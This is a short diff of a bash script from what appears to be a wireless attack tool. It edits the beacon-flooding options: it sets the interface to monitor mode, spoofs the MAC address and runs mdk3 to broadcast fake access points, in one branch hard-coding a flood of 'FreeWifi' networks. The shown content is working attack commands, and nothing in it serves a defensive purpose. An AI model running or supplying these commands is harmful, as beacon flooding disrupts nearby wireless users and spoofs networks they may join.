@@ -18,7 +18,6 @@ elif [[ "$SO" == "2" ]]; then # Beacon Flooding
     changeWImode monitor
     changeMac
     mdk3 $WI b -f "$folder/wordlist.txt" -a -s 1000
-
   elif [[ "$SO" == "2" ]]; then # Wordlist
     getInput "Wordlist File" "Enter Wordlist Path." "/root/desktop/wordlist.txt"
     changeWImode monitor
@@ -27,10 +26,10 @@ elif [[ "$SO" == "2" ]]; then # Beacon Flooding
   elif [[ "$SO" == "3" ]]; then # Specific
     getInput "Network Name" "Type a string" "xPWNEDx"
     string=$SI
-    getInput "Number of APs" "Enter the number of Access Points to generate." "1000"
-    N=$SI
-    COUNT=1
+    # getInput "Number of APs" "Enter the number of Access Points to generate." "1000"
+    # N=$SI
     mdk3 wlan0 b -n FreeWifi -m
+    # COUNT=1
     # while [ $COUNT -lt $N ] || [ $COUNT -eq $N ]; do
     #   echo $string $COUNT >> "$string.txt"
     #   let COUNT=COUNT+1
